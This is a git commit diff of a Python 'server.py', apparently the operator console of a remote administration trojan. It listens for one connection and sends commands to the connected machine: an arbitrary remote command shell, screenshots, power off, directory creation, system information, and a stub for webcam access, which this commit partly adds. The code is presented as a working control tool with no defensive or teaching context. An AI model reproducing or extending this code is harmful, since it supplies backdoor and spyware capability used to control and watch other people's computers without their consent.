c061735db97db0f1eed0309e05eb5ed5017654a5
dimagamera <46674070+dimagamera@users.noreply.github.com>
2021-06-17 13:32:29 +0300

    Update server.py

--- server.py
+++ server.py
@@ -7,11 +7,25 @@ s.bind((host, port))
 s.listen(1)
 conn, addr = s.accept()
 while True:
-    a = input('/cmd - Сommand line\n/screen - ScreenShot\n > ')
+
+    a = input('/cmd - Сommand line\n/mkdir - Make directory\n/poff - Power off\n/sysinfo - system information\n/screen - ScreenShot\n> ')
     conn.send(a.encode())
+
     if a == '/cmd':
         cmd = input('#> ')
         conn.send(cmd.encode())
         cmd_process = conn.recv(5000)
         cmd_process = str(cmd_process, "cp866")
         print(cmd_process)
+
+    elif a == '/mkdir':
+        dir = input('Name directory > ')
+        conn.send(dir.encode())
+
+    elif a == '/sysinfo':
+        sysinfo = conn.recv(5000)
+        sysinfo = str(sysinfo, 'cp866')
+        print(sysinfo)
+
+    elif a == '/webcam':
+        pass
